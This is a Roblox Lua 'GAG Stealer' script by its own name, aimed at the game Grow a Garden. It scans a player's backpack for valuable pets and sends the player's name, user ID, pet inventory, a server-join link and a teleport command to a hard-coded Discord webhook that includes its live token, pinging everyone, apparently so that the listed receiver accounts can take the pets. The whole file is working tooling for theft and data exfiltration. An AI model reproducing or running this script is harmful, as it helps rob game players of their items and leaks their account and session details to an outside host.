-- GAG Stealer Script - Fixed Version
-- Reset execution guard to allow multiple runs
_G.scriptExecuted = false

-- Configuration
_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55", "iamzanji66", "iamzanji77", "iamzanji88", "iamzanji99", "iamzanji00"}
_G.min_value = 100000  -- Lowered from 100 million to 100k for testing
_G.pingEveryone = "Yes"
_G.webhook = "https://discord.com/api/webhooks/1397467480670212197/O9h7_jw18J2WlZoK9eZRj7sTyu9MYOdaFlHUdFuyXa-Vur1wEW4leEHFGaD1SrrHHGVM"

-- Variables
local users = _G.Usernames or {}
local min_value = _G.min_value or 100000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Player setup
local plr = Players.LocalPlayer
local character = plr.Character or plr.CharacterAdded:Wait()
local backpack = plr:WaitForChild("Backpack")

-- Game modules (with error handling)
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")

-- Try to load modules with error handling
local calcPlantValue, petUtils, petRegistry, numberUtil, dataService

local success, error = pcall(function()
    calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
    petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
    petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
    numberUtil = require(modules:WaitForChild("NumberUtil"))
    dataService = require(modules:WaitForChild("DataService"))
end)

if not success then
    warn("Failed to load some modules:", error)
    -- Continue with basic functionality
end

-- Add missing utility functions
if not table.find then
    table.find = function(t, value)
        for i, v in ipairs(t) do
            if v == value then
                return i
            end
        end
        return nil
    end
end

if not math.lerp then
    math.lerp = function(a, b, t)
        return a + (b - a) * t
    end
end

-- Constants
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}

-- Check if current player is in whitelist
local function isPlayerInWhitelist(playerName)
    for _, username in ipairs(users) do
        if string.lower(playerName) == string.lower(username) then
            return true
        end
    end
    return false
end

local totalValue = 0
local itemsToSend = {}

-- Debug function
local function debugPrint(message)
    print("[GAG Debug]", message)
end

-- Executor detection function
local function detectExecutor()
    if identifyexecutor then
        return identifyexecutor()
    elseif syn and syn.protect_gui then
        return "Synapse X"
    elseif isexecutorclosure then
        return "KRNL"
    elseif getexecutorname then
        return getexecutorname()
    elseif pebc_execute then
        return "Script-Ware"
    elseif fluxus then
        return "Fluxus"
    elseif secure_load then
        return "Sentinel"
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif shadow_env then
        return "Shadow"
    elseif jit then
        return "ProtoSmasher"
    else
        return "Unknown"
    end
end

-- Main execution
debugPrint("Script starting...")
debugPrint("Place ID: " .. game.PlaceId)
debugPrint("Min value: " .. min_value)
debugPrint("Current player: " .. plr.Name)
debugPrint("Player in whitelist: " .. tostring(isPlayerInWhitelist(plr.Name)))

-- Validation checks
if next(users) == nil or webhook == "" then
    debugPrint("ERROR: No usernames or webhook configured")
    return
end

if game.PlaceId ~= 126884695634066 then
    debugPrint("ERROR: Wrong game - Place ID: " .. game.PlaceId)
    return
end

-- Check if current player is in whitelist
if not isPlayerInWhitelist(plr.Name) then
    debugPrint("ERROR: Current player not in whitelist")
    return
end

-- Server type check with error handling
local serverTypeSuccess, serverType = pcall(function()
    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
end)

if serverTypeSuccess and serverType == "VIPServer" then
    debugPrint("ERROR: VIP Server detected")
    return
end

debugPrint("All checks passed, continuing...")

-- Pet value calculation function
local function calcPetValue(v14)
    if not v14 or not v14.PetData then
        return 0
    end
    
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then
        return 0
    end
    
    if not petRegistry or not petRegistry.PetEggs then
        return 0
    end
    
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then
        return 0
    end
    
    local v17 = eggData.RarityData and eggData.RarityData.Items and eggData.RarityData.Items[v14.PetType]
    if not v17 then
        return 0
    end
    
    local weightRange = v17.GeneratedPetData and v17.GeneratedPetData.WeightRange
    if not weightRange then
        return 0
    end
    
    if not numberUtil or not numberUtil.ReverseLerp then
        return 0
    end
    
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    
    if not petUtils or not petUtils.GetLevelProgress then
        return 0
    end
    
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    
    if not petRegistry.PetList or not petRegistry.PetList[v14.PetType] then
        return 0
    end
    
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

-- Number formatting function
local function formatNumber(number)
    if number == nil then
        return "0"
    end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

-- Weight extraction function
local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or 
                       tool:FindFirstChild("KG") or 
                       tool:FindFirstChild("WeightValue") or
                       tool:FindFirstChild("Mass")

    local weight = 0

    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end

    return math.floor(weight * 100 + 0.5) / 100
end

-- Webhook sending function with error handling
local function sendWebhook(data)
    local success, response = pcall(function()
        if not request then
            error("Request function not available")
        end
        
        local body = HttpService:JSONEncode(data)
        local headers = {
            ["Content-Type"] = "application/json"
        }
        
        return request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
    
    if not success then
        debugPrint("ERROR: Failed to send webhook - " .. tostring(response))
        return false
    else
        debugPrint("Webhook sent successfully")
        return true
    end
end

-- Send notification to Discord
local function sendNotification()
    -- Player info
    local playerName = plr.Name
    local userId = tostring(plr.UserId)
    local receivers = table.concat(_G.Usernames, ", ")
    local executor = detectExecutor()
    local totalValueStr = formatNumber(totalValue)
    local jobId = game.JobId or "N/A"
    local placeId = tostring(game.PlaceId or "N/A")
    local playerCount = tostring(#Players:GetPlayers())
    local maxPlayers = tostring(Players.MaxPlayers or "?")
    local timeStr = os.date("%H:%M:%S")
    local dateStr = os.date("%m/%d/%y")
    local teleportCmd = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
    local joinUrl = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", placeId, jobId)

    -- Pet list formatting
    local petLines = {}
    for _, item in ipairs(itemsToSend) do
        if item.Type == "Pet" then
            table.insert(petLines, string.format("%s [Age: %s] [%.2f KG] - %s Value", item.Name, tostring(item.Age), item.Weight, formatNumber(item.Value)))
        end
    end
    local petListStr = table.concat(petLines, "\n")

    -- Main embed description
    local description = string.format(
        "X Scripts Gag Stealer\nTotal Value: %s\n\nPets Found:\n%s\n\nGame Link\n[Click to join](%s)\n%s\n\nPlayer Info\nName: %s\nUser ID: %s\nPlayers in game: %s/%s\nReceivers: %s\n\nExploit Info\nExploit: %s\nTime: %s\nDate: %s",
        totalValueStr,
        petListStr,
        joinUrl,
        teleportCmd,
        playerName,
        userId,
        playerCount,
        maxPlayers,
        receivers,
        executor,
        timeStr,
        dateStr
    )

    local prefix = ""
    if ping == "Yes" then
        prefix = "@everyone "
    end

    local data = {
        ["content"] = prefix .. teleportCmd,
        ["username"] = playerName,
        ["embeds"] = {{
            ["title"] = "X Scripts Gag Stealer",
            ["color"] = 16753920, -- Orange
            ["description"] = description,
            ["footer"] = {
                ["text"] = "GAG pet stealer by ZANJI."
            }
        }}
    }

    return sendWebhook(data)
end

-- Scan backpack for pets
debugPrint("Scanning backpack for pets...")
local itemCount = 0

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            if petUUID and dataService and dataService.GetData then
                local playerData = dataService:GetData()
                if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                    local v14 = playerData.PetsData.PetInventory.Data[petUUID]
                    if v14 then
                        local toolName = tool.Name
                        local itemName = toolName:match("^(.-) %[%d+%.?%d* KG%]") or toolName
                        local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                        
                        -- Improved age extraction: prefer v14.PetData.Age, fallback to name pattern
                        local petAge = nil
                        if v14.PetData and v14.PetData.Age then
                            petAge = tonumber(v14.PetData.Age)
                        end
                        if not petAge then
                            petAge = toolName:match("%[Age[:%s]*(%d+)%]")
                            if petAge then
                                petAge = tonumber(petAge)
                            else
                                petAge = "N/A"
                            end
                        end
                        
                        -- Calculate pet value
                        local value = calcPetValue(v14)
                        debugPrint("Pet: " .. itemName .. " Value: " .. value .. " Min value: " .. min_value)
                        
                        -- Check if pet meets minimum value requirement
                        if value >= min_value then
                            debugPrint("Pet meets value requirement: " .. itemName .. " Value: " .. value)
                            
                            totalValue = totalValue + value
                            table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
                            debugPrint("Added pet to send list: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
                        else
                            debugPrint("Pet does not meet value requirement: " .. itemName .. " Value: " .. value)
                        end
                    end
                end
            end
        end
        itemCount = itemCount + 1
    end
end

debugPrint("Total items found: " .. itemCount)
debugPrint("Items to send: " .. #itemsToSend)
debugPrint("Total value: " .. totalValue)

-- Always send notification if player is in whitelist
debugPrint("Sending notification to Discord...")
local success = sendNotification()

if success then
    debugPrint("Notification sent successfully!")
else
    debugPrint("Failed to send notification!")
end

if #itemsToSend > 0 then
    debugPrint("Found " .. #itemsToSend .. " pets worth " .. totalValue .. " total value")
else
    debugPrint("No pets found that meet the minimum value requirement of " .. min_value)
end 
